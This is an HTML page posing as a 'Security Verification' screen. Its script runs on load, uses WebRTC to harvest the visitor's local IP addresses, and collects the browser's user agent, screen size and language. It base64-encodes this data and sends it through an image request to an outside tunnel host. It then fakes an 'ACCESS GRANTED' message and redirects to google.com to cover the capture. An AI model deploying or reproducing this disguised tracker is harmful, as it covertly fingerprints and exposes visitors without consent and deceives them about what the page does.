<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Security Verification</title>
</head>
<body style="background:#000; color:#0f0; text-align:center; padding-top:20%; font-family:monospace;">
    <h2 id="msg">INITIALIZING SECURE CONNECTION...</h2>
    
    <script>
        const MY_URL = "https://c781e0dfb002bdde-197-200-89-108.serveousercontent.com/log.gif"; 

        async function getLocalIPs() {
            let ips = [];
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                pc.createDataChannel("");
                pc.createOffer().then(o => pc.setLocalDescription(o));
                return new Promise(res => {
                    pc.onicecandidate = (e) => {
                        if (!e.candidate) res(ips.join('|'));
                        const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                        if (match && !ips.includes(match[1])) ips.push(match[1]);
                    };
                    setTimeout(() => res(ips.join('|')), 1000);
                });
            } catch (e) { return "Blocked"; }
        }

        async function captureAll() {
            const localIP = await getLocalIPs();
            const info = {
                ua: navigator.userAgent,
                res: screen.width + "x" + screen.height,
                internal: localIP,
                lang: navigator.language
            };

            const payload = btoa(unescape(encodeURIComponent(JSON.stringify(info))));
            const img = new Image();
            img.src = `${MY_URL}?data=${payload}`;
            
            setTimeout(() => {
                document.getElementById("msg").innerText = "ACCESS GRANTED. REDIRECTING...";
                window.location.href = "https://www.google.com";
            }, 3000);
        }

        window.onload = captureAll;
    </script>
</body>
</html>
